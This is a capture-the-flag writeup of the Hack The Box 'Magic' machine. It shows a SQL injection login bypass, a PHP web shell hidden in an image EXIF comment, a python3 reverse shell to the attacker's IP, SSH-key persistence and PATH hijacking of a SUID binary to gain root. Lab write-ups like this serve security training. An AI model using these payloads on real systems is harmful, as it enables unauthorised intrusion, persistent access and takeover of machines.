---
title: "Magic"
description: "Writeup for Magic machine from HTB"
date: 2020-08-03
author: "Pablo Jesús González Rubio"
cover: "magic.png"
coverAlt: "Magic icon"
toc: true
tags: [ "Writeup" ]
---

## Scanning

Hosts: `10.10.10.185 magic.htb`

Nmap output:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Bypassing

### Login

As gobuster can't find too much we try to login to upload a file.

To log in we simply input a SQL injection on the login form:

User: `' or 1=1 --` and Pass: `' or 1=1 --`

### Fooling the Image Uploader

Uploading an image and modifying the request with Burp didn't work so we upload a normal `.jpg` but modified with and EXIF comment:

```
exiftool -Comment='<?php system($_REQUEST['cmd']); ?>' test.jpg
```

And finally, we change the name to execute PHP: `mv test.jpg test.php.jpg`, as the Apache server interprets both extensions.

### Getting a shell

We try a reverse shell with python but it seems it's not installed so we try it with python3:

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.20",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

And getting the shell was as simple as: 

```
http://magic.htb/images/uploads/test.php.jpg?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.20",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

We listen to the connection with `nc -lnvp 4444`.

So we get `www-data` user.

## Privilege Escalation

### User

We do the TTY procedure and start searching for credentials. As is an intermediate machine it shouldn't be too far.

Searching in the `/var/www` we find a PHP database with the credentials `theseus:iamkingtheseus` for the database `Magic`.

We try to dump the database with `mysqldump Magic -u theseus -piamkingtheseus` and it dumps:

```
www-data@ubuntu:/var/www/html$ mysqldump Magic -u theseus -piamkingtheseus
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- MySQL dump 10.13  Distrib 5.7.29, for Linux (x86_64)
--
-- Host: localhost    Database: Magic
-- ------------------------------------------------------
-- Server version	5.7.29-0ubuntu0.18.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `login`
--

DROP TABLE IF EXISTS `login`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `login` (
  `id` int(6) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `password` varchar(100) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `login`
--

LOCK TABLES `login` WRITE;
/*!40000 ALTER TABLE `login` DISABLE KEYS */;
INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
/*!40000 ALTER TABLE `login` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2020-08-02  4:35:26
```

It stored some credentials: `admin:Th3s3usW4sK1ng`

I tried to dump `login` table but it didn't work, so the next move was trying that password `su theseus` to change from `www-data` to `theseus` user, and it worked!

#### Persistence

To maintain a connection and keep it in case I lost my shell, I copy my `~/.ssh/id_rsa.pub` key to the Theseus `~/.ssh/authorized_keys`.

In case you don't have the `id_rsa.pub` just `ssh-keygen` and it will create them for you!

### Root

We search for SUID files:

```
/usr/sbin/pppd
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/arping
/usr/bin/vmware-user-suid-wrapper
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/snapd/snap-confine
/snap/core18/1223/bin/mount
/snap/core18/1223/bin/ping
/snap/core18/1223/bin/su
/snap/core18/1223/bin/umount
/snap/core18/1223/usr/bin/chfn
/snap/core18/1223/usr/bin/chsh
/snap/core18/1223/usr/bin/gpasswd
/snap/core18/1223/usr/bin/newgrp
/snap/core18/1223/usr/bin/passwd
/snap/core18/1223/usr/bin/sudo
/snap/core18/1223/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1223/usr/lib/openssh/ssh-keysign
/snap/core18/1668/bin/mount
/snap/core18/1668/bin/ping
/snap/core18/1668/bin/su
/snap/core18/1668/bin/umount
/snap/core18/1668/usr/bin/chfn
/snap/core18/1668/usr/bin/chsh
/snap/core18/1668/usr/bin/gpasswd
/snap/core18/1668/usr/bin/newgrp
/snap/core18/1668/usr/bin/passwd
/snap/core18/1668/usr/bin/sudo
/snap/core18/1668/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1668/usr/lib/openssh/ssh-keysign
/snap/core/8689/bin/mount
/snap/core/8689/bin/ping
/snap/core/8689/bin/ping6
/snap/core/8689/bin/su
/snap/core/8689/bin/umount
/snap/core/8689/usr/bin/chfn
/snap/core/8689/usr/bin/chsh
/snap/core/8689/usr/bin/gpasswd
/snap/core/8689/usr/bin/newgrp
/snap/core/8689/usr/bin/passwd
/snap/core/8689/usr/bin/sudo
/snap/core/8689/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8689/usr/lib/openssh/ssh-keysign
/snap/core/8689/usr/lib/snapd/snap-confine
/snap/core/8689/usr/sbin/pppd
/snap/core/7917/bin/mount
/snap/core/7917/bin/ping
/snap/core/7917/bin/ping6
/snap/core/7917/bin/su
/snap/core/7917/bin/umount
/snap/core/7917/usr/bin/chfn
/snap/core/7917/usr/bin/chsh
/snap/core/7917/usr/bin/gpasswd
/snap/core/7917/usr/bin/newgrp
/snap/core/7917/usr/bin/passwd
/snap/core/7917/usr/bin/sudo
/snap/core/7917/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/7917/usr/lib/openssh/ssh-keysign
/snap/core/7917/usr/lib/snapd/snap-confine
/snap/core/7917/usr/sbin/pppd
/bin/umount
/bin/fusermount
/bin/sysinfo
/bin/mount
/bin/su
/bin/ping
```

After trying some things I searched for the permissions of these files:

```
131127 28K -rwsr-xr-x 1 root root 27K Jan  8  2020 /bin/umount
131130 32K -rwsr-xr-x 1 root root 31K Aug 11  2016 /bin/fusermount
393232 24K -rwsr-x--- 1 root users 22K Oct 21  2019 /bin/sysinfo
131123 44K -rwsr-xr-x 1 root root 43K Jan  8  2020 /bin/mount
131231 44K -rwsr-xr-x 1 root root 44K Mar 22  2019 /bin/su
131203 64K -rwsr-xr-x 1 root root 63K Jun 28  2019 /bin/ping
```

I searched for crons with `pspy32` and tried each one of that commands to verify what occurs, `sysinfo` threw:

```
2020/08/02 05:22:11 CMD: UID=0    PID=4647   | 
2020/08/02 05:22:59 CMD: UID=0    PID=4649   | sh -c lshw -short 
2020/08/02 05:22:59 CMD: UID=0    PID=4648   | sysinfo 
2020/08/02 05:22:59 CMD: UID=0    PID=4650   | lshw -short 
2020/08/02 05:23:00 CMD: UID=0    PID=4655   | sh -c fdisk -l 
2020/08/02 05:23:00 CMD: UID=0    PID=4656   | fdisk -l 
2020/08/02 05:23:00 CMD: UID=0    PID=4658   | cat /proc/cpuinfo 
2020/08/02 05:23:00 CMD: UID=0    PID=4657   | sh -c cat /proc/cpuinfo 
2020/08/02 05:23:00 CMD: UID=0    PID=4660   | sh -c free -h 
2020/08/02 05:23:00 CMD: UID=0    PID=4659   | sh -c free -h
```

It is executed at the same time fdisk as root.

#### Path Hijacking

> The way this works is because *sysinfo* executed *fdisk* with a relative path and not the absolute one. So we hijack the PATH to make the OS search *fdisk* in the first directory with it inside, in this case is ours. So it executes our file instead of the original one.

To exploit this what I've done was change the path adding `Theseus` directory to the first entry with: `export PATH=$(pwd):$PATH` and created a file named `fdisk`. Inside was a reverse shell in python3. 

Instantly when executed `sysinfo`, it executed my `fdisk` file and got the reverse shell as root!

## Summary

 - To get `www-data` I had to bypass a login form with sqli, then upload a modified photo (via EXIF comment) and then execute the URL to get the reverse shell.
 -  To get `Theseus` user I had to look in the webpage database and with the found credential I dumped the database, then I changed to user `Theseus` with `su`.
 -  To get `root` I had to verify SUID files, find their permissions, and what was executed when trying those files. After, Path Hijacking with a reverse shell was the way.